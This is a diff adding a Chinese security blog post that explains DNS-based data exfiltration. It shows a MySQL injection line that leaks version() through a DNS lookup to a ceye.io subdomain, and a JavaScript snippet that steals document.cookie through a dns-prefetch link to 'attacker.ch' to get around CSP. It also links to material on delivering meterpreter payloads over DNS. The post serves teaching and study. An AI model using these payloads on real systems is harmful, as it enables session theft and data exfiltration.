@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用DNS通道传输一点数据">
+<meta property="og:url" content="http://hebic.me/2017/08/19/利用DNS通道传输一点数据/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://120.25.80.195:7230/06/3169708276.jpg">
+<meta property="og:updated_time" content="2017-08-20T00:54:43.396Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用DNS通道传输一点数据">
+<meta name="twitter:description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
+<meta name="twitter:image" content="http://120.25.80.195:7230/06/3169708276.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>利用DNS通道传输一点数据</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/08/19/在Update的注入中如果关闭了显错该怎么办/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/08/19/CSP绕过姿势总结（2017.3.1更新）/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&text=利用DNS通道传输一点数据"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&is_video=false&description=利用DNS通道传输一点数据"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用DNS通道传输一点数据&body=Check out this article: http://hebic.me/2017/08/19/利用DNS通道传输一点数据/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&name=利用DNS通道传输一点数据&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL中的DNS"><span class="toc-number">1.</span> <span class="toc-text">SQL中的DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS中的DNS"><span class="toc-number">2.</span> <span class="toc-text">XSS中的DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透测试中的DNS"><span class="toc-number">3.</span> <span class="toc-text">渗透测试中的DNS</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        利用DNS通道传输一点数据
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Homaebic-Know thyself</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-08-19T09:15:10.000Z" itemprop="datePublished">2017-08-19</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。</p>
+<h3 id="SQL中的DNS"><a href="#SQL中的DNS" class="headerlink" title="SQL中的DNS"></a>SQL中的DNS</h3><p>在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会记录下这个数据。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\\\\\'</span>,<span class="keyword">version</span>(),<span class="string">'.ikyzvu.ceye.io'</span>));</div></pre></td></tr></table></figure></p>
+<p>查询DNS记录就可以看到需要的数据。不过使用DNS信道带出数据在SQL注入中比较少，毕竟load_file不可以随便就使用的。</p>
+<p><img src="http://120.25.80.195:7230/06/3169708276.jpg" alt="QQ截图20170609091548.jpg"></p>
+<h3 id="XSS中的DNS"><a href="#XSS中的DNS" class="headerlink" title="XSS中的DNS"></a>XSS中的DNS</h3><p>在XSS的防御机制中有一个叫做CSP的东西，这个东西是一个维护人员可以自定义的白名单，以限制脚本和各种外部资源的加载。</p>
+<p>一个网站的CSP设置非常的凶悍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;self&apos;</div></pre></td></tr></table></figure></p>
+<p>看起来他只允许内部的脚本执行。<b>但是CSP的开发初衷是预防XSS漏洞，而没有考虑到信息泄露的问题。</b>因此使用DNS通道将获得的信息传递出来就显得很bug，DNS预读取可以做到这个。将需要的信息与域名结合起来使用DNS通道传输出来。需要注意的是火狐浏览器的X-DNS-Prefetch-Control头可以阻止DNS预读取传递信息。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> sessionid = <span class="built_in">document</span>.cookie.split(<span class="string">'='</span>)[<span class="number">1</span>]+<span class="string">"."</span>;</div><div class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</div><div class="line"><span class="comment">// injecting the link tag in the HTML body force the browser</span></div><div class="line"><span class="comment">// to prefetch the given domain</span></div><div class="line">body.innerHTML = body.innerHTML + <span class="string">"&lt;link rel=\\"</span>dns-prefetch\\<span class="string">"</span></div><div class="line"><span class="string">  href=\\"</span><span class="comment">//" + sessionid + "attacker.ch\\"&gt;";</span></div></pre></td></tr></table></figure>
+<h3 id="渗透测试中的DNS"><a href="#渗透测试中的DNS" class="headerlink" title="渗透测试中的DNS"></a>渗透测试中的DNS</h3><p>我的渗透水平非常差，又看到连着好几篇文章写道使用DNS通道传输meterpreter payload绕过杀软。没有去复现，就把原文贴过来。</p>
+<ol>
+<li><a href="http://bobao.360.cn/learning/detail/3466.html" target="_blank" rel="external">通过DNS传输后门来绕过杀软</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3550.html" target="_blank" rel="external">利用DNS AAAA记录和IPv6地址传输后门</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3607.html" target="_blank" rel="external">针对利用DNS的TXT记录查询进行通信绕过杀软检测的木马分析</a></li>
+</ol>
+<p>如果你愿意，甚至可以使用DNS传输文件：<a href="https://github.com/breenmachine/dnsftp" target="_blank" rel="external">Use only DNS queries to download a file, and then execute it.</a></p>
+<p>对于需要将数据传输出来的地方不止于此，尤其是在读文件时，文件内容没有显示出来时，DNS通道也许是个选择。具体的利用方法还需要慢慢的挖掘。</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL中的DNS"><span class="toc-number">1.</span> <span class="toc-text">SQL中的DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS中的DNS"><span class="toc-number">2.</span> <span class="toc-text">XSS中的DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透测试中的DNS"><span class="toc-number">3.</span> <span class="toc-text">渗透测试中的DNS</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&text=利用DNS通道传输一点数据"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&is_video=false&description=利用DNS通道传输一点数据"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用DNS通道传输一点数据&body=Check out this article: http://hebic.me/2017/08/19/利用DNS通道传输一点数据/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&title=利用DNS通道传输一点数据"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/08/19/利用DNS通道传输一点数据/&name=利用DNS通道传输一点数据&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Homaebic-Know thyself
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
